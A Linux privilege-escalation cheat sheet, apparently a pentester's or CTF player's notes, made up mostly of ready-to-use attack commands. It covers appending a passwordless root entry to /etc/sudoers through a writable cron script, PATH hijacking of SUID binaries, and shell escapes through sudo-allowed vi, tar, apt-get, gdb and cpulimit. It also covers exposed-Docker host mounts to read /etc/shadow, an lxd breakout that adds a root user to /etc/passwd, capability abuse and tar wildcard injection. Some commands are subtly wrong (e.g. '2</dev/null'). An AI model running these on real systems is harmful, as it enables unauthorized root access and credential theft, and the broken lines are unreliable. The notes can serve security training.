### PRIVESC notes

### suid bits
- Finding files with suid bit

      find / -perm -u=s -type f 2</dev/null

### CRON JOBS
  <a href="https://vk9-sec.com/exploiting-the-cron-jobs-misconfigurations-privilege-escalation/">Link to MORE ON CRON JOBS</a>
- Check cronjobs with

       cat /etc/crontab
- Check if the cron job is running with

      service cron status
  
- Script to run if you can write a cronjob script

       import os 
       import sys
       try:
          print("on it")
          os.system("echo 'www-data ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers")
       except:
            print("Didn't work")
            sys.exit()

### PRIVESC WITH PATH VARIABLE MANIPULATION
- If a binary does not detail the path to run another binary e.g not using (/usr/bin/curl) {stating the path}

    ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/f0562606-ec66-47bb-a419-9293ca0a62f1)

- You can manipulate the path and get a root shell.It should be noted the binary you are exploiting must have a suidbit

      cd /tmp
      echo "/bin/sh" > <binary you eant to attack>
      chmod 700 curl
      export PATH=/tmp:$PATH

   ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/cf277f1d-1664-4ea8-a1f0-1461101c5006)
   
### Privesc with pkexec(suidbit) ver 0.105(CVE-2021-4034)
   Use this <a href="https://github.com/arthepsy/CVE-2021-4034">exploit</a>
   <a href="https://www.exploit-db.com/exploits/50689">Exploit db's link</a>

### if a user is allowed to run vi as root with no password

             sudo /usr/bin/vi
             :!/bin/bash

### Privesc with tar if a user can run it as root with no password
 
  ![image](https://github.com/SENSEIXENUS2/SENSEIXENUS2.github.io/assets/98669513/43c6206f-dda5-4b01-9ca4-af2b28e47ca6)

- Use

       sudo /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

### Privesc with docker api on port 2375

      docker -H <IP>:2375 run --rm -it --privileged --net=host -v /:/mnt alpine

### file access

      cat /mnt/etc/shadow

### RCE <getting root with that user>

     chroot /mnt

### PRIVESC WITH APT-GET IF A USER CAN RUN IT WITH SUDO

    sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
### Privesc on sudo version 1.8.2-1.8.31p2 and 1.9.0-1.9.5p1 [Baron Samedit]

  ### Test it with

    sudoedit -s '\' $(python3 -c 'print("A"*1000)')
- Link to exploit <a href="https://github.com/blasty/CVE-2021-3156">Link to exploit</a>

### IF SUID BIT IS SET IN A GDB BINARY

    gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit

### PRIVESC WITH LXC MISCONFIGURED CONTAINER

- To check if a user is part of the lxd group,use this command

  `cat /etc/passwd | awk -F ':' '{print $1}' | xargs -L1 id | grep -i "lx"`
- Check if lxd is running as user with

    `cat /etc/passwd | grep "lxd"`
- Running processes of ps -aux
  `cat /etc/passwd | grep "lxd"`

- Build a container on your machine with this commands,run it as root though

      git clone https://github.com/saghul/lxd-alpine-builder.git
      cd lxd-alpine-builder
      ./build-alpine
 
-  Receive it on your target machine with pyhton,test directories like `/dev/shm` or`/tmp`,receive the file on your target machine
 with python http.server.Send the one with a recent date

- Initiate the image

       lxc init alpine juggernaut -c security.privileged=true
       lxc config device add juggernaut gimmeroot disk source=/ path=/mnt/root recursive=true
       lxc start juggernaut
       lxc list

- Execute as root

      lxc exec juggernaut sh
  
- If you cannot find storage devices,you have to create one,use brtfs and if the server does not support ipv6,set it to none

      lxd init

- After executing,breakout with `chroot /mnt/root`

- Creating a new user can help us escalate privileges,on your system,do `openssl passwd {choice of password}` and in your target machine do this



      echo '[usernameyou want]:[openssl generated hash]:0:0:root:/root:/bin/bash' >> /mnt/root/etc/passwd`

### Privesc with capabilities
  Capabilities work by breaking the actions normally reserved for root down into smaller portions. The use of capabilities is only beginning to drop into userland applications as most system utilities do not shed their root privileges. Let’s move ahead that how we can use this permission more into our task.

Limited user’s permission: As we know Giving away too many privileges by default will result in unauthorized changes of data, backdoors and circumventing access controls, just to name a few. So to overcome this situation we can simply use the capability to limited user’s permission.

Using a fine-grained set of privileges: Use of capability can be more clearly understood by another example. Suppose a web server normally runs at port 80 and we also know that we need root permissions to start listening on one of the lower ports (<1024). This web server daemon needs to be able to listen to port 80. Instead of giving this daemon all root permissions, we can set a capability on the related binary, like CAP_NET_BIND_SERVICE. With this specific capability, it can open up port 80 in a much easier way.

  - To enable a binary'scapabilities, use

        setcap cap_setuid+ep /home/demo/python3
  - To find binaries with capabilities,use to check the whole system recursively

        getcap -r / 2</dev/null
  ###IF CAP_SETUID is active
  - Python binary ,use

        ./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
        
  - Perl binary
    
        ./perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
  - Tar binary
    If CAP_DAC_READ_SEARCH is active,we can bypass restrictions and read files and access directories e.g we can read the /etc/shadow file

          ./tar cvf shadow.tar /etc/shadow  
          ls
          ./tar -xvf shadow.tar
        
### TAR WILDCARDS

            cd /opt/backup
            echo -e '#!/bin/bash\n/bin/bash' > shell.sh
            echo "" > "--checkpoint-action=exec=sh shell.sh"
            echo "" > --checkpoint=1

### PRIVESC WITH CPULIMIT binary if suid bit set

       cpulimit -l 100 -f -- /bin/sh -p



            
